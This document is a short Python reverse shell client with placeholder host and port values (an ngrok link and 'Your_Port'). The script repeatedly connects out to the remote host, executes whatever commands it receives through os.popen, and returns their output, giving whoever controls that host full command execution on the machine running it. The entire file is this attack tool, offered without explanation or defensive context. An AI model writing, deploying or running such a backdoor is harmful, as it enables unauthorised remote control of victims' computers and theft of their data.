from socket import socket
from time import sleep
from os import popen
from sys import exit

HOST = 'ngrok:link'
PORT = Your_Port

client_socket = socket()
while True:
     try:
          client_socket.connect((HOST,PORT))
          break
     except ConnectionResetError:
          sleep(5)
while True:
    response = client_socket.recv(10000)
    if response == b'exit\n':
          client_socket.close()
          exit()
    data = popen(response.decode()).read()
    client_socket.send(data.encode())
